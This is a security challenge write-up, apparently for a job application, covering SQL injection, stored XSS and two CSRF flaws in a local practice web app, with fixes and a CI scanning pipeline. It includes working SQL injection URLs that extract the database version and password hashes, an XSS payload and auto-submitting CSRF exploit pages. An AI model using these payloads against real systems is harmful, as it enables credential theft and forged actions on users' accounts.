# Application Security Engineer Challenge

During the course of the challenge, four vulnerabilities were discovered. One of these vulnerabilities, specifically an SQL injection, was addressed and resolved to successfully complete the challenge.

### 1. Answer 

### 1. The application's main potion search box.

#### Vulnerablity: SQL Injection

#### Description: 

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

#### PoC: 

The initial payload, which resulted in an error.
```http://localhost:4000/?name=%27%3D0--%2B```  
```
[no match of right hand side value: {:error, %Postgrex.Error{connection_id: 52389, message: nil, postgres: %{code: :undefined_function, file: "parse_oper.c", hint: "No operator matches the given name and argument types. You might need to add explicit type casts.", line: "647", message: "operator does not exist: boolean = integer", pg_code: "42883", position: "94", routine: "op_error", severity: "ERROR", unknown: "ERROR"}, query: "SELECT p.id, p.name, p.milliliters, p.price, p.secret\nFROM potions as p\nWHERE p.name LIKE '%'=0--+%' AND p.secret = false\n"}}]
```
The error showed the direct interpolation of user input ['name'] into SQL query, indicating a strong potential for exploiting a SQL injection vulnerability.

![1_SQL](https://github.com/user-attachments/assets/fc71a205-2862-4606-98b5-c2dfa05fa427)


For successful exploitation, the following payload was utilized. 

```http://localhost:4000/?name=%27%20OR%201%3D1%20-```

The payload ' OR 1=1 -- exploits a SQL injection vulnerability to bypass restrictions in the query. Normally, the query filters potions by name and ensures they are not secret. However, the payload ends the name filter condition and adds OR 1=1, which always evaluates to TRUE, making the WHERE clause ineffective. The -- comments out the rest of the query, ignoring any conditions like p.secret = false. This tricks the database into returning all potions, including those that are normally hidden or secret, exposing sensitive data.

![2_SQL](https://github.com/user-attachments/assets/32d4b925-2f91-4561-a431-f9a55ebd659e)


To retrieve the DBMS banner, the following link was used along with the payload.

```http://localhost:4000/?name=potion%27+AND+8683%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28COALESCE%28CAST%28VERSION%28%29+AS+VARCHAR%2810000%29%29%3A%3Atext%2C%28CHR%2832%29%29%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29+AS+NUMERIC%29--+Lqjf```

![Dbms_Burp](https://github.com/user-attachments/assets/4123e649-7465-4ffc-acc8-b1fee0bddd23)


![3_SQL](https://github.com/user-attachments/assets/822d2ecc-f090-4087-8e82-7baebed31178)


To retrieve the hash of the Database Management System user, the following approach was utilized.

```http://localhost:4000/?name=potion%27%20AND%203205=CAST((CHR(113)||CHR(112)||CHR(112)||CHR(120)||CHR(113))||(SELECT%20COALESCE(CAST(passwd%20AS%20VARCHAR(10000))::text,(CHR(32)))%20FROM%20pg_shadow)::text||(CHR(113)||CHR(122)||CHR(98)||CHR(120)||CHR(113))%20AS%20NUMERIC)--%20iRse```

![4_SQL](https://github.com/user-attachments/assets/ad5de96b-3fb7-4ecc-9794-2fe9b8a0a6c2)

#### Impact:

A successful SQL injection attack can result in unauthorized access to sensitive data, such as:
				Passwords.
				Credit card details.
				Personal user information.

SQL injection attacks have been used in many high-profile data breaches over the years. These have caused reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.

#### Mitigation:

The vulnerablity was fixed using Ecto Query Builder, which safely constructs and executes SQL queries in Elixir applications. ```The change has also been committed to the repository.```

#### Original Vulnerable Code
```
  def search_potions(name) do
    q = """
    SELECT p.id, p.name, p.milliliters, p.price, p.secret
    FROM potions as p
    WHERE p.name LIKE '%#{name}%' AND p.secret = false
    """
    {:ok, %{rows: rows}} =
      Ecto.Adapters.SQL.query(Repo, q)
    Enum.map(rows, fn row ->
      [id, name, milliliters, price, secret] = row
      %Potion{id: id, name: name, milliliters: milliliters, price: price, secret: secret}
    end)
  end
```
#### Fixed Source Code
```
  def search_potions(name) do
    # Fixing SQL injection vulnerability using Ecto Query Builders
    query =
      from p in Potion,
        where: like(p.name, ^"%#{name}%") and p.secret == false,
        select: %{id: p.id, name: p.name, milliliters: p.milliliters, price: p.price, secret: p.secret}

    # Execute the query and return results
    Repo.all(query)
    |> Enum.map(fn row ->
      %Potion{
        id: row.id,
        name: row.name,
        milliliters: row.milliliters,
        price: row.price,
        secret: row.secret
      }
    end)
  end
```
#### Explaination of Changes:

The updated search_potions/1 function uses the Ecto Query Builder to construct a secure query. It filters potions based on the name parameter (using like(p.name, ^"%#{name}%")) and ensures that only non-secret potions are included (p.secret == false). The query binds the name input securely with the ^ operator, which treats the input as data, thus preventing SQL injection by avoiding the direct inclusion of user input in the SQL code. After executing the query, the results are mapped into Potion structs, ensuring consistent and structured data formatting. This approach makes the function secure and immune to SQL injection vulnerabilities.

#### References: 

https://curiosum.com/blog/sql-injections-vselixir#:~:text=Elixir%2C%20particularly%20through%20its%20Ecto,queries%20by%20injecting%20malicious%20SQL

https://portswigger.net/web-security/sql-injection

### Follow-up Question 

How you would implement a SAST tool as part of this application's Continuous Integration pipeline to automatically detect these vulnerabilities?

### Answer  

To integrate a SAST tool into an application's Continuous Integration (CI) pipeline, I would start with a reliable CI/CD tool, such as Jenkins, TeamCity, or a similar platform, to manage the pipeline workflow. I would then choose a suitable SAST tool like SonarQube, Veracode etc. Next, I would configure a webhook in the Version Control System (VCS), such as GitHub, Bitbucket, or GitLab, to trigger the pipeline whenever there is a push or a pull request is created or updated to develop,UAT or QA branch.

In the CI/CD pipeline, I would include steps to pull the latest code, perform static code analysis using the SAST tool, and generate comprehensive reports in suiteable formats like XML, JSON, or HTML. These reports would serve as actionable insights for developers. I would configure thresholds (depending upon the company's policy) within the pipeline to automatically fail builds if critical or high vulnerabilities are detected, while providing warnings for medium and low-risk issues. Additionally, I would integrate the pipeline with a vulnerability management tool like DefectDojo to upload and centralize the scanning reports. This step would ensure that both security teams and developers have clear visibility into the reported vulnerabilities and can collaborate effectively on resolving them. Furthermore, I would integrate DefectDojo with JIRA, so tickets for vulnerabilities are automatically created and prioritized based on severity and business impact.

For efficiency, I would implement incremental or delta scanning, where only the modified parts of the code are analyzed during each build, and schedule full scans periodically or i.e when tag is pushed/pull request created to develop or main branch to ensure comprehensive security coverage. To provide developers with instant feedback, I would configure the SAST tool to annotate pull requests, flagging security issues directly during code reviews.

To keep everyone informed, I would set up notifications via email, Slack, or Microsoft Teams to share scan results and build statuses. I would also continuously refine the SAST tool configurations to adapt to evolving security threats and coding practices. By taking these steps, I would ensure that security checks are embedded early in the development cycle, fostering a shift-left security culture. This approach not only improves collaboration between development and security teams but also strengthens the overall security posture of the application.

### Example Pipeline

##### (Tools and platforms: Jenkins + Bitbucket + SonarQube + DefectDojo + Slack (Tools, platform, structure and logic can be changed if required))
##### (Trigger : Pull Request Created/updated (can be changed to commit/push))
##### (Build status always SUCCESS , individual stage status can be FAILURE (pipeline structure and logic can be changed if required))

```groovy

pipeline {
    agent {
        label 'app-sec'
    }
    environment {
        defectDojoToken = "${env.defectDojoToken_ENV}"
        xcsrfToken = "${env.xcsrfToken_ENV}"
        currentDate = sh(script: 'date +%Y-%m-%d', returnStdout: true).trim()
        BITBUCKET_URL = "${env.BITBUCKET_URL_API_ENV}"
        TARGET_BRANCH = 'QA/UAT/DEV'
        BITBUCKET_REPO_OWNER = "team"
        BITBUCKET_REPO_SLUG = "Repo"
        REPO_URL = "${env.REPO_URL_ENV}"
        SONAR_TOKEN = "${env.SONAR_TOKEN}"
        BITBUCKET_ACCESS_TOKEN = "${env.BITBUCKET_ACCESS_TOKEN_ENV}"
        SLACK_CHANNEL = 'channel name'
        SLACK_WEBHOOK_URL = "${env.webhook_slack_env}"
    }
    stages {
        stage('Checking PR') {
            steps {
                script {
                    catchError(buildResult: 'SUCCESS', stageResult: 'FAILURE') {
                        def prId = env.BITBUCKET_PULL_REQUEST_ID
                        def sourceBranch = env.BITBUCKET_SOURCE_BRANCH

                        if (!prId) {
                            error "No pull request ID found."
                        }

                        echo "Pull Request ID: ${prId}"
                        echo "Source Branch: ${sourceBranch}"
                    }
                }
            }
        }
        stage('Checkout and Fetch Delta') {
            steps {
                script {
                    catchError(buildResult: 'SUCCESS', stageResult: 'FAILURE') {
                        sh """
                            git checkout ${TARGET_BRANCH}
                            git fetch ${REPO_URL} ${BITBUCKET_SOURCE_BRANCH}:${BITBUCKET_SOURCE_BRANCH}
                        """

                        def deltaFiles = sh(script: """
                            git diff --name-only origin/${BITBUCKET_SOURCE_BRANCH}..${TARGET_BRANCH}
                        """, returnStdout: true).trim()

                        echo "Files Changed:\n${deltaFiles}"
                        env.DELTA_FILES = deltaFiles
                    }
                }
            }
        }
        stage('Static Application Security Test') {
            steps {
                script {
                    catchError(buildResult: 'SUCCESS', stageResult: 'FAILURE') {
                        def sonarProjectKey = 'key'
                        def sonarHostUrl = 'https://sonar.xyz.com/'
                        def sonarBaseDir = "${env.WORKSPACE}"
                        def sonarbin = '/opt/sonar-scanner/sonar-scanner-linux/bin/sonar-scanner'
                        def reportbin = '/usr/local/bin/sonar-report'
                        def sonarOutputFile = "${env.WORKSPACE}/SonarReport.html"
                        def commitMessage = sh(returnStdout: true, script: 'git log -1 --pretty=%B').trim()
                        def tag = "${commitMessage.replaceAll('[^a-zA-Z0-9-_]', '_')}"
                        sh "git checkout ${env.BITBUCKET_SOURCE_BRANCH}"
                        withSonarQubeEnv('Sonar_Server') {
                            sh "\"${sonarbin}\" -Dsonar.host.url=${sonarHostUrl} -Dsonar.projectBaseDir=${sonarBaseDir} -Dsonar.login=${SONAR_TOKEN} -Dsonar.branch.name=${env.BITBUCKET_SOURCE_BRANCH}"
                        }
                        sh "\"${reportbin}\" --project=${sonarProjectKey} --sonarurl=https://sonardev.xyz.com/ --sonarcomponent=${sonarProjectKey} --sonartoken=${SONAR_TOKEN} --branch=${env.BITBUCKET_SOURCE_BRANCH} --in-new-code-period --output ${sonarOutputFile}"
                        uploadScanToDefectDojo("SonarQube Scan", sonarOutputFile, tag)
                    }
                }
            }
            post {
                success {
                    sendSlackNotification('Static Application Security Test', 'success')
                }
                failure {
                    sendSlackNotification('Static Application Security Test', 'failure')
                }
            }
        }
    }
     post {
        always {
            echo 'Cleaning up...'
            deleteDir()
        }
        success {
            script {
                bitbucketStatusNotify(buildState: 'SUCCESSFUL', buildKey: env.BUILD_ID, buildName: 'Build', repoSlug: 'repo', repoOwner: 'team')
            }
        }
        failure {
            script {
                bitbucketStatusNotify(buildState: 'FAILED', buildKey: env.BUILD_ID, buildName: 'Build', repoSlug: 'repo', repoOwner: 'team')
            }
        }
    }
}
def sendSlackNotification(String stageName, String status = "success") {
    def color = status == "success" ? "#36a64f" : "#ff0000"
    def emoji = status == "success" ? ":white_check_mark:" : ":x:"
    def text = status == "success" ? "${stageName} stage completed." : "${stageName} stage failed."

    def payload = [
        channel: "${SLACK_CHANNEL}",
        attachments: [
            [
                fallback: "${stageName} ${status}.",
                color: color,
                title: "${stageName} ${status}.",
                text: "${emoji} ${text}"
            ]
        ]
    ]
    def jsonPayload = groovy.json.JsonOutput.toJson(payload)
    sh "curl -X POST -H 'Content-type: application/json' --data '${jsonPayload}' ${SLACK_WEBHOOK_URL}"
}
def uploadScanToDefectDojo(scanType, scanOutputFile, tag) {
    sh """
    curl -k -X POST \
      'https://defectdojo.xyz.com:8443/api/v2/import-scan/' \
      -H 'Authorization: ${defectDojoToken}' \
      -H 'accept: application/json' \
      -H 'Content-Type: multipart/form-data' \
      -H 'X-CSRFTOKEN: ${xcsrfToken}' \
      -F 'product_type_name=' \
      -F 'active=true' \
      -F 'do_not_reactivate=' \
      -F 'endpoint_to_add=' \
      -F 'verified=true' \
      -F 'close_old_findings=' \
      -F 'test_title=' \
      -F 'engagement_name=' \
      -F 'build_id=' \
      -F 'deduplication_on_engagement=' \
      -F 'push_to_jira=' \
      -F 'minimum_severity=' \
      -F 'close_old_findings_product_scope=false' \
      -F 'scan_date=${currentDate}' \
      -F 'create_finding_groups_for_all_findings=' \
      -F 'engagement_end_date=' \
      -F 'test=' \
      -F 'environment=' \
      -F 'service=' \
      -F 'commit_hash=' \
      -F 'group_by=' \
      -F 'version=' \
      -F 'tags= ${env.BITBUCKET_PULL_REQUEST_ID}' \
      -F 'apply_tags_to_findings=' \
      -F 'api_scan_configuration=' \
      -F 'product_name=' \
      -F "file=@${scanOutputFile};type=application/json" \
      -F 'auto_create_context=' \
      -F 'lead=' \
      -F "scan_type=${scanType}" \
      -F 'branch_tag=' \
      -F 'engagement=' \
      -F 'source_code_management_uri='
    """
}
```
----------------------------------------------------------------------------------------------------------------------------------------------

### 2. Answer 

### 2. A potion's review box.

#### Vulnerability: Cross-Site Scripting (Stored)

#### Description: 

Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

#### PoC:

I injected the payload <svg onload=alert('XSS')> into the potion's review box on the web application. Since the application doesn't properly sanitize or escape user input, the payload was stored in the database as part of the review. As a result, whenever any user visits the page where the review is displayed, the browser renders the SVG element and triggers the onload event, executing the embedded JavaScript code. This causes an alert box with the message XSS to pop up on the user's screen. By doing this, I exploited the stored XSS vulnerability to execute arbitrary JavaScript code whenever a user views the affected review. 

![5 XSS_Stored](https://github.com/user-attachments/assets/675f947f-608d-4906-ba89-4f8c171191a5)

#### Impact: 

The impact of stored XSS can be severe, as it allows attackers to inject malicious scripts that are permanently stored on the server and served to all users who visit the affected page. These scripts can execute in the victims' browsers, potentially leading to session hijacking, theft of sensitive information like login credentials or personal data, defacement of content, and redirection to malicious websites. In more advanced attacks, stored XSS can be used to perform actions on behalf of the user without their consent, escalate privileges, or compromise the security of the entire application. This makes stored XSS a critical vulnerability that can significantly harm both users and the application.

#### Mitigation: 

The mitigation for stored XSS involves input validation and sanitization to block malicious content, using libraries to filter out dangerous characters like <, >, and &. Output encoding should be applied before rendering user data, ensuring injected HTML or JavaScript is treated as data, not executable code. Functions like HTML.escape/1 in Elixir/Phoenix can encode characters into safe HTML equivalents.

Additionally, Implementing a Content Security Policy (CSP) restricts the execution of harmful scripts, while marking cookies as HttpOnly and Secure helps protect sensitive data. Configuring proper CORS policies limits cross-origin requests, reducing the risk of attacks.

#### References: 

https://help.fluidattacks.com/portal/en/kb/articles/criteria-fixes-elixir-010#Need

https://portswigger.net/web-security/cross-site-scripting/stored

---------------------------------------------------------------------------------------------------------------------------------------------

### 3. Answer

### 3. A potion's review form.

#### Vulnerability: Cross Site Request Forgery (Missing CSRF Protection)

#### Description: 

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

#### PoC: 

I exploited a CSRF vulnerability in the potion shop application. While logged in as attacker@gmail.com, I crafted a malicious HTML form that submitted a review to the endpoint http://localhost:4000/potion/review/2. In the form, I included a hidden input field with the email set to victim@gmail.com. When I submitted the form, the review was successfully posted, and it appeared as if it had been submitted by victim@gmail.com. This demonstrates a CSRF vulnerability, as the server did not verify that the logged-in user owned the email specified in the form and CSRF token. By exploiting this flaw, I was able to forge actions on behalf of another user, highlighting the need for proper CSRF protection and server-side validation of CSRF tokens.

As an initial test vector, I removed the CSRF token and forwarded the request to the server. The review was successfully submitted, indicating a strong potential for exploiting a CSRF vulnerability.  

![No_CSRFtoken_Validation](https://github.com/user-attachments/assets/bf36ce0b-b985-4532-a35b-28e39d994e40)

![no_csrf_valiation2](https://github.com/user-attachments/assets/ab093107-8a37-4347-b410-6672c3c23f59)

To showcase the exploit, I crafted an HTML page with embedded JavaScript. I hosted this exploit, and after accessing it, the review appeared as if it had been submitted by victim@gmail.com.

![6 CSRF](https://github.com/user-attachments/assets/4e57acb6-f49c-4868-aee2-b1772bf9ab3a)

![7_CSRF](https://github.com/user-attachments/assets/a0783293-431d-4a8e-a9e2-29af8a956c3f)


#### Exploit: 

```
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF Exploit</title>
  </head>
  <body>
    <h1>CSRF Exploit</h1>

    <form action="http://localhost:4000/potion/review/2" method="post" id="reviewForm">
      <!-- <%= csrf_meta_tag() %> CSRF Token -->

      <textarea name="review[body]" required>not effective, do not buy</textarea>

      <select id="review_score" name="review[score]">
        <option value="1" selected>1</option> <!-- Changed to selected -->
        <option value="2">2</option>
        <option value="3">3</option>
        <option value="4">4</option>
        <option value="5">5</option>
      </select>

      <input id="review_email" name="review[email]" type="hidden" value="victim@gmail.com">

      <button type="submit">Submit Review</button>
    </form>

    <script>
      window.onload = function() {
        document.getElementById('reviewForm').submit();
      };
    </script>

  </body>
</html>
```

#### Impact: 

In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

#### Mitigation: 

To mitigate CSRF vulnerabilities, implementing server-side validation of CSRF tokens is essential. A CSRF token is a unique, unpredictable value generated for each user session and included in every form or state-changing request. When a request is received, the server validates the token to ensure it matches the one issued for the user's session. If the token is absent, invalid, or does not match, the request is rejected. This ensures that malicious forms crafted by attackers cannot execute unauthorized actions on behalf of authenticated users. Additionally, using secure cookies, enforcing SameSite attributes, and validating user session ownership further strengthen the protection against CSRF attacks.

#### References: 

https://hexdocs.pm/plug/Plug.CSRFProtection.html

https://portswigger.net/web-security/csrf

---------------------------------------------------------------------------------------------------------------------------------------------

### 4. Answer

### 4. The User's bio form in the Settings page.

#### Vulnerability: Cross Site Request Forgery (CSRF via Action Reuse)

#### Description: 

The vulnerability arises due to action reuse in the application, where the same endpoint (/users/settings/edit_bio) accepts both GET and POST requests. This allows an attacker to craft a malicious GET request that modifies the user's bio without their consent. The issue is caused by not properly checking the HTTP method and not using anti-CSRF tokens for GET requests.

#### PoC: 

I identified a Cross-Site Request Forgery (CSRF) vulnerability in the GET endpoint /users/settings/edit_bio, which allowed unauthorized updates to a user’s bio 	without proper verification of the request origin or the implementation of CSRF protection mechanisms.

To demonstrate the issue, I crafted a malicious URL.

```http://localhost:4000/users/settings/edit_bio?user%5Bbio%5D=Got+Hacked```

When this URL was accessed by victim@gmail.com, a GET request was automatically sent by the browser to the server, resulting in the bio being changed to "Got Hacked". 

![csrf_burp](https://github.com/user-attachments/assets/fe0d0376-acab-44de-a96f-51c55f8a4679)

![bio_change_burp](https://github.com/user-attachments/assets/c2be8e94-1b34-4ca0-9b5b-9918c8ce8985)

To showcase the exploit, I crafted an HTML page with embedded JavaScript to redirect the victim’s browser to the malicious URL. I hosted this exploit, and after accessing it, the bio of the victim user was successfully changed to "Got Hacked".

![Edit_bio](https://github.com/user-attachments/assets/239da47a-a58e-423d-9a5e-e09a320c2dc7)

![8_CSRF_Reuse](https://github.com/user-attachments/assets/e91236e2-9807-4a7d-933f-674326ebf971)

#### Exploit:         : 
```
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>You are being redirected...</h1>
    <script>
        window.location.href = "http://localhost:4000/users/settings/edit_bio?user%5Bbio%5D=Got+Hacked";
    </script>
</body>
</html>
```
#### Impact: 

The impact of this vulnerability is significant, as it allows unauthorized state changes in user accounts and highlights the absence of essential security measures, such as CSRF tokens and origin validation. Proper mitigation techniques like implementing CSRF tokens, restricting state-changing operations to POST requests, and using SameSite cookies would prevent such attacks and enhance the application's security posture.

In a successful CSRF attack, the attacker can modify the victim's profile information (e.g., bio, email, or other settings), potentially escalate the attack to perform more harmful actions if other sensitive endpoints are similarly vulnerable and damage the reputation of the application by defacing user profiles or spreading malicious content.

#### Mitigation: 

To mitigate this vulnerability, the following steps should be taken:

Restrict Sensitive Actions to POST Requests:
Ensure that actions that modify data (e.g., updating user profiles) are only accessible via POST requests. GET requests should only be used for idempotent operations (e.g., retrieving data).
				
Implement Anti-CSRF Tokens:
Generate a unique anti-CSRF token for each user session and include it in forms or requests that modify data. Validate the token on the server side for every request.
				
Validate the HTTP Referer Header:
Check the Referer header to ensure that the request originates from the same domain. This can help prevent cross-origin requests.
				
Use SameSite Cookies:
Set the SameSite attribute for cookies to Strict or Lax to prevent cookies from being sent in cross-site requests.


#### References: 

https://hexdocs.pm/plug/Plug.CSRFProtection.html

https://portswigger.net/web-security/csrf
